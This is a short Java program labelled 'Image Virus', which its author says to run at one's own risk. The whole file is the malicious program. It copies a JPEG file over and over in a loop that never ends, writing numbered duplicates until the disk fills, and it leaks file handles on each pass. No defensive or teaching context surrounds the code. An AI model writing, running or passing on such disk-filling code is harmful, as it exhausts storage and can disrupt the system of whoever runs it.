/*
Image Virus - Run at your own risk! 
@Author Vinit Shahdeo
*/
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;

class ImageVirus{
	public static void main(String[] args)
	{
		File f=new File("images/vinit.jpg");
		int i=1;
		if(f.exists())
		{
			System.out.println("File exists");
		}
		FileInputStream fis=null;
		FileOutputStream fos=null;
		try{
			
			while(i>0)
			{
				fis=new FileInputStream(f);

				fos=new FileOutputStream("images/vinit"+i+".jpg");
				byte[] b=new byte[fis.available()];
				while((fis.read(b)!=-1))
				{
				  fos.write(b);
				}
				i++;
			}
		}
		catch(FileNotFoundException e)
		{
			System.out.println(e.getMessage());
		}
		catch(IOException e)
		{
			System.out.println(e.getMessage());
		}
		finally{
			try{
				fis.close();
				fos.flush();
				fos.close();
			}
			catch(Exception e){
				System.out.println(e.getMessage());
			}
		}
	}
}